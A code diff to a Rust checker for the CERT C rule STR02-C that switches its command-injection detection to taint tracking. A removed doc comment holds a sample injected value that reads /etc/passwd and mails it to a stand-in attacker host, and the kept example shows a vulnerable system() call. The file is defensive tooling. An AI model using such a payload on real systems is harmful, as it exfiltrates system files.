@@ -6,14 +6,15 @@
 //!
 //! Resolves macro aliases (#define SYSTEM system) via project context.
 //!
+//! Uses intra-function taint tracking: only flags system()/popen() calls when
+//! the argument is tainted by external input sources (recv, scanf, fgets, etc.).
+//!
 //! ## Non-compliant example:
 //!
 //! ```c
 //! char buffer[512];
 //! sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
 //! system(buffer);  // User-controlled addr can inject commands
-//!
-//! // Attacker provides: bogus@addr.com; cat /etc/passwd | mail attacker@evil.com
 //! ```
 //!
 //! ## Compliant solution:
@@ -21,13 +22,6 @@
 //! ```c
 //! // Use execl() instead of system() to avoid shell interpretation
 //! execl("/bin/mail", "mail", addr, (char *)NULL);
-//!
-//! // Or whitelist acceptable characters
-//! if (strspn(addr, "abcdefghijklmnopqrstuvwxyz@.-_") != strlen(addr)) {
-//!     // Invalid characters detected
-//!     return ERROR;
-//! }
-//! system(buffer);
 //! ```
 
 use super::super::{CertRule, RuleViolation};
@@ -36,8 +30,22 @@ use crate::analyze::context::ProjectContext;
 use crate::manifest::{RuleCategory, Severity};
 use crate::utility::cert_c::ast_utils::get_node_text;
 use std::cell::RefCell;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use tree_sitter::Node;
+
+/// Functions whose return values or output parameters introduce tainted data.
+const TAINT_SOURCES: &[&str] = &[
+    "recv", "recvfrom", "recvmsg", "read", "fread", "fgets", "fgetws", "gets", "scanf", "fscanf",
+    "sscanf", "getenv", "getchar", "getwchar", "fgetc", "fgetwc", "getc", "getwc", "gets_s",
+    "fgets_s", "wscanf", "fwscanf", "swscanf",
+];
+
+/// Functions that copy/concatenate taint: if any source arg is tainted,
+/// the destination becomes tainted. (dest is typically first arg.)
+const TAINT_PROPAGATORS: &[&str] = &[
+    "strcpy", "strncpy", "strcat", "strncat", "sprintf", "snprintf", "memcpy", "memmove", "wcscpy",
+    "wcsncpy", "wcscat", "wcsncat", "swprintf",
+];
 
 pub struct Str02C {
     project_aliases: RefCell<HashMap<String, String>>,
@@ -62,11 +70,222 @@ impl Str02C {
         }
     }
 
+    /// Walk all nodes: for function bodies use taint tracking,
+    /// for bare code (no function) fall back to non-literal detection.
+    fn check_functions(&self, node: &Node, source: &str, violations: &mut Vec<RuleViolation>) {
+        if node.kind() == "function_definition" {
+            self.check_single_function(node, source, violations);
+            return;
+        }
+        // Bare code at translation_unit level: use non-literal fallback
+        if node.kind() == "call_expression" {
+            if self.find_containing_function(node).is_none() {
+                self.check_dangerous_function_call_legacy(node, source, violations);
+            }
+        }
+        for i in 0..node.child_count() {
+            if let Some(child) = node.child(i) {
+                self.check_functions(&child, source, violations);
+            }
+        }
+    }
+
+    /// Find the containing function_definition for a node, if any.
+    fn find_containing_function<'a>(&self, node: &Node<'a>) -> Option<Node<'a>> {
+        let mut current = *node;
+        while let Some(parent) = current.parent() {
+            if parent.kind() == "function_definition" {
+                return Some(parent);
+            }
+            current = parent;
+        }
+        None
+    }
+
+    /// Analyze a single function: collect tainted variables, then check sinks.
+    fn check_single_function(
+        &self,
+        func_node: &Node,
+        source: &str,
+        violations: &mut Vec<RuleViolation>,
+    ) {
+        let mut tainted: HashSet<String> = HashSet::new();
+
+        // Function parameters are tainted by default (external input)
+        self.collect_param_names(func_node, source, &mut tainted);
+
+        // Collect tainted variables from the function body
+        self.collect_tainted_vars(func_node, source, &mut tainted);
+
+        // Check sinks (system/popen/exec) for tainted arguments
+        self.check_sinks(func_node, source, &tainted, violations);
+    }
+
+    /// Extract parameter names from a function definition and mark them as tainted.
+    fn collect_param_names(&self, func_node: &Node, source: &str, tainted: &mut HashSet<String>) {
+        if let Some(declarator) = func_node.child_by_field_name("declarator") {
+            self.find_param_names(&declarator, source, tainted);
+        }
+    }
+
+    fn find_param_names(&self, node: &Node, source: &str, tainted: &mut HashSet<String>) {
+        if node.kind() == "parameter_declaration" {
+            // Get the declarator child which has the parameter name
+            if let Some(decl) = node.child_by_field_name("declarator") {
+                let name = get_node_text(&decl, source);
+                let base = extract_base_var(&name);
+                if !base.is_empty() {
+                    tainted.insert(base);
+                }
+            }
+            return;
+        }
+        for i in 0..node.child_count() {
+            if let Some(child) = node.child(i) {
+                self.find_param_names(&child, source, tainted);
+            }
+        }
+    }
+
+    /// Walk a function body to find variables tainted by external input.
+    fn collect_tainted_vars(&self, node: &Node, source: &str, tainted: &mut HashSet<String>) {
+        if node.kind() == "call_expression" {
+            self.check_taint_from_call(node, source, tainted);
+        }
+
+        for i in 0..node.child_count() {
+            if let Some(child) = node.child(i) {
+                self.collect_tainted_vars(&child, source, tainted);
+            }
+        }
+    }
+
+    /// Check if a call expression introduces taint into a variable.
+    fn check_taint_from_call(&self, call_node: &Node, source: &str, tainted: &mut HashSet<String>) {
+        let func_name = match call_node.child_by_field_name("function") {
+            Some(f) => {
+                let name = get_node_text(&f, source);
+                self.resolve_name(&name)
+            }
+            None => return,
+        };
+
+        let args_node = match call_node.child_by_field_name("arguments") {
+            Some(a) => a,
+            None => return,
+        };
+
+        let args = self.collect_arguments(&args_node, source);
+
+        // Direct taint sources: the function returns or writes tainted data
+        if TAINT_SOURCES.contains(&func_name.as_str()) {
+            match func_name.as_str() {
+                // recv(sock, buf, ...) — buf (arg 1) is tainted
+                "recv" | "recvfrom" | "recvmsg" | "read" | "fread" => {
+                    if let Some(buf_name) = args.get(1) {
+                        tainted.insert(extract_base_var(buf_name));
+                    }
+                }
+                // fgets(buf, size, stream) — buf (arg 0) is tainted
+                "fgets" | "fgetws" | "fgets_s" | "gets" | "gets_s" => {
+                    if let Some(buf_name) = args.first() {
+                        tainted.insert(extract_base_var(buf_name));
+                    }
+                }
+                // scanf("%s", &var) — all args after format are tainted
+                "scanf" | "fscanf" | "sscanf" | "wscanf" | "fwscanf" | "swscanf" => {
+                    for arg in args.iter().skip(1) {
+                        tainted.insert(extract_base_var(arg));
+                    }
+                }
+                // getenv() — return value is tainted (check assignment)
+                "getenv" => {
+                    self.taint_assignment_target(call_node, source, tainted);
+                }
+                _ => {
+                    // Generic: taint the assignment target if any
+                    self.taint_assignment_target(call_node, source, tainted);
+                }
+            }
+        }
+
+        // Taint propagation: strcpy(dest, src) — if src is tainted, dest becomes tainted
+        if TAINT_PROPAGATORS.contains(&func_name.as_str()) {
+            let has_tainted_source = args.iter().skip(1).any(|arg| {
+                let base = extract_base_var(arg);
+                tainted.contains(&base)
+            });
+            if has_tainted_source {
+                if let Some(dest) = args.first() {
+                    tainted.insert(extract_base_var(dest));
+                }
+            }
+        }
+    }
+
+    /// If a call is used in an assignment (e.g., `data = getenv("HOME")`),
+    /// taint the assigned variable.
+    fn taint_assignment_target(
+        &self,
+        call_node: &Node,
+        source: &str,
+        tainted: &mut HashSet<String>,
+    ) {
+        if let Some(parent) = call_node.parent() {
+            match parent.kind() {
+                "assignment_expression" => {
+                    if let Some(left) = parent.child_by_field_name("left") {
+                        tainted.insert(extract_base_var(&get_node_text(&left, source)));
+                    }
+                }
+                "init_declarator" => {
+                    if let Some(decl) = parent.child_by_field_name("declarator") {
+                        tainted.insert(extract_base_var(&get_node_text(&decl, source)));
+                    }
+                }
+                _ => {}
+            }
+        }
+    }
+
+    /// Collect argument text strings from an argument_list node.
+    fn collect_arguments(&self, args_node: &Node, source: &str) -> Vec<String> {
+        let mut args = Vec::new();
+        for i in 0..args_node.child_count() {
+            if let Some(child) = args_node.child(i) {
+                if child.kind() != "(" && child.kind() != ")" && child.kind() != "," {
+                    args.push(get_node_text(&child, source).to_string());
+                }
+            }
+        }
+        args
+    }
+
+    /// Check system()/popen()/exec*() calls for tainted arguments.
+    fn check_sinks(
+        &self,
+        node: &Node,
+        source: &str,
+        tainted: &HashSet<String>,
+        violations: &mut Vec<RuleViolation>,
+    ) {
+        if node.kind() == "call_expression" {
+            self.check_dangerous_function_call(node, source, tainted, violations);
+        }
+
+        for i in 0..node.child_count() {
+            if let Some(child) = node.child(i) {
+                self.check_sinks(&child, source, tainted, violations);
+            }
+        }
+    }
+
     /// Check for calls to dangerous functions with potentially unsanitized arguments
     fn check_dangerous_function_call(
         &self,
         node: &Node,
         source: &str,
+        tainted: &HashSet<String>,
         violations: &mut Vec<RuleViolation>,
     ) {
         if node.kind() != "call_expression" {
@@ -80,7 +299,7 @@ impl Str02C {
             match resolved.as_str() {
                 "system" | "popen" => {
                     self.check_command_injection_risk(
-                        node, source, &func_name, &resolved, violations,
+                        node, source, &func_name, &resolved, tainted, violations,
                     );
                 }
                 "execl" | "execle" | "execlp" | "execv" | "execvp" | "execve" | "_execl"
@@ -92,47 +311,111 @@ impl Str02C {
         }
     }
 
-    /// Check system() and popen() calls for command injection risk
+    /// Check system() and popen() calls for command injection risk.
+    /// Only flags when the argument is tainted by external input.
     fn check_command_injection_risk(
         &self,
         node: &Node,
         source: &str,
         display_name: &str,
         resolved_name: &str,
+        tainted: &HashSet<String>,
         violations: &mut Vec<RuleViolation>,
     ) {
         if let Some(args_node) = node.child_by_field_name("arguments") {
-            // Get first argument
             if let Some(first_arg) = self.get_first_argument(&args_node) {
-                let arg_text = get_node_text(&first_arg, source);
-
-                // Check if argument is a string literal (safe) or a variable/expression (risky)
-                if !self.is_string_literal(&first_arg) {
-                    let label = if display_name != resolved_name {
-                        format!("{} (macro for {})", display_name, resolved_name)
-                    } else {
-                        resolved_name.to_string()
-                    };
-
-                    violations.push(RuleViolation {
-                        rule_id: self.rule_id().to_string(),
-                        severity: self.severity(),
-                        message: format!(
-                            "Call to {}() with non-literal argument '{}' detected. This may allow command injection if the string contains unsanitized user input or environment variables.",
-                            label, arg_text.trim()
-                        ),
-                        file_path: String::new(),
-                        line: node.start_position().row + 1,
-                        column: node.start_position().column + 1,
-                        suggestion: Some(
-                            format!(
-                                "Sanitize the string argument before passing to {}() by whitelisting acceptable characters, or use exec*() functions instead of system() to avoid shell interpretation.",
-                                resolved_name
-                            )
-                        ),
-                        ..Default::default()
-                    });
+                // String literals are always safe
+                if self.is_string_literal(&first_arg) {
+                    return;
                 }
+
+                let arg_text = get_node_text(&first_arg, source);
+                let base_var = extract_base_var(&arg_text);
+
+                // Only flag if the argument is tainted by external input
+                if !tainted.contains(&base_var) {
+                    return;
+                }
+
+                let label = if display_name != resolved_name {
+                    format!("{} (macro for {})", display_name, resolved_name)
+                } else {
+                    resolved_name.to_string()
+                };
+
+                violations.push(RuleViolation {
+                    rule_id: self.rule_id().to_string(),
+                    severity: self.severity(),
+                    message: format!(
+                        "Call to {}() with tainted argument '{}'. Data from external input sources must be sanitized before passing to command processors.",
+                        label, arg_text.trim()
+                    ),
+                    file_path: String::new(),
+                    line: node.start_position().row + 1,
+                    column: node.start_position().column + 1,
+                    suggestion: Some(
+                        format!(
+                            "Sanitize the string argument before passing to {}() by whitelisting acceptable characters, or use exec*() functions instead of system() to avoid shell interpretation.",
+                            resolved_name
+                        )
+                    ),
+                    ..Default::default()
+                });
+            }
+        }
+    }
+
+    /// Legacy check for bare code (no function context): flag any non-literal
+    /// argument to system()/popen(). Used when taint tracking isn't possible.
+    fn check_dangerous_function_call_legacy(
+        &self,
+        node: &Node,
+        source: &str,
+        violations: &mut Vec<RuleViolation>,
+    ) {
+        if node.kind() != "call_expression" {
+            return;
+        }
+        if let Some(function_node) = node.child_by_field_name("function") {
+            let func_name = get_node_text(&function_node, source);
+            let resolved = self.resolve_name(&func_name);
+
+            match resolved.as_str() {
+                "system" | "popen" => {
+                    if let Some(args_node) = node.child_by_field_name("arguments") {
+                        if let Some(first_arg) = self.get_first_argument(&args_node) {
+                            if !self.is_string_literal(&first_arg) {
+                                let arg_text = get_node_text(&first_arg, source);
+                                let label = if func_name != resolved {
+                                    format!("{} (macro for {})", func_name, resolved)
+                                } else {
+                                    resolved.to_string()
+                                };
+                                violations.push(RuleViolation {
+                                    rule_id: self.rule_id().to_string(),
+                                    severity: self.severity(),
+                                    message: format!(
+                                        "Call to {}() with non-literal argument '{}' detected. This may allow command injection if the string contains unsanitized user input or environment variables.",
+                                        label, arg_text.trim()
+                                    ),
+                                    file_path: String::new(),
+                                    line: node.start_position().row + 1,
+                                    column: node.start_position().column + 1,
+                                    suggestion: Some(format!(
+                                        "Sanitize the string argument before passing to {}() by whitelisting acceptable characters, or use exec*() functions instead of system() to avoid shell interpretation.",
+                                        resolved
+                                    )),
+                                    ..Default::default()
+                                });
+                            }
+                        }
+                    }
+                }
+                "execl" | "execle" | "execlp" | "execv" | "execvp" | "execve" | "_execl"
+                | "_execle" | "_execlp" | "_execv" | "_execvp" | "_execve" => {
+                    self.check_exec_family_call(node, source, &func_name, &resolved, violations);
+                }
+                _ => {}
             }
         }
     }
@@ -240,6 +523,68 @@ impl Str02C {
     }
 }
 
+/// Extract the base variable name from an expression.
+/// "data" → "data", "&data" → "data", "data + offset" → "data",
+/// "data_buf" → "data_buf", "*ptr" → "ptr",
+/// "(char *)(data + dataLen)" → "data"
+fn extract_base_var(expr: &str) -> String {
+    let s = expr.trim();
+    // Strip leading & or *
+    let s = s.strip_prefix('&').unwrap_or(s);
+    let s = s.strip_prefix('*').unwrap_or(s);
+    let s = s.trim();
+
+    // Handle cast expressions: (type)(expr) or (type)expr
+    // Skip past (type) prefix(es), then extract from the remaining expression
+    let s = strip_casts(s);
+
+    // Take up to first non-identifier character
+    s.chars()
+        .take_while(|c| c.is_alphanumeric() || *c == '_')
+        .collect()
+}
+
+/// Strip C cast prefixes like "(char *)", "(int)", etc.
+/// Returns the remaining expression after all leading casts are removed.
+fn strip_casts(s: &str) -> &str {
+    let mut s = s;
+    loop {
+        let trimmed = s.trim();
+        if !trimmed.starts_with('(') {
+            return trimmed;
+        }
+        // Find matching close paren
+        if let Some(close) = trimmed.find(')') {
+            let inside = &trimmed[1..close];
+            // If content looks like a type cast (contains * or is a known type keyword),
+            // strip it and continue
+            if inside.contains('*')
+                || matches!(
+                    inside.trim(),
+                    "char"
+                        | "int"
+                        | "long"
+                        | "short"
+                        | "unsigned"
+                        | "signed"
+                        | "void"
+                        | "size_t"
+                        | "ssize_t"
+                        | "uint8_t"
+                        | "int8_t"
+                )
+            {
+                s = &trimmed[close + 1..];
+                continue;
+            }
+            // Otherwise it's a parenthesized expression like (data + len)
+            // — extract from inside
+            return inside;
+        }
+        return trimmed;
+    }
+}
+
 impl CertRule for Str02C {
     fn rule_id(&self) -> &'static str {
         "STR02-C"
@@ -272,21 +617,7 @@ impl CertRule for Str02C {
         *self.current_aliases.borrow_mut() = aliases;
 
         let mut violations = Vec::new();
-        self.check_node(node, source, &mut violations);
+        self.check_functions(node, source, &mut violations);
         violations
-    }
-}
-
-impl Str02C {
-    fn check_node(&self, node: &Node, source: &str, violations: &mut Vec<RuleViolation>) {
-        // Check for dangerous function calls
-        self.check_dangerous_function_call(node, source, violations);
-
-        // Recursively check child nodes
-        for i in 0..node.child_count() {
-            if let Some(child) = node.child(i) {
-                self.check_node(&child, source, violations);
-            }
-        }
     }
 }
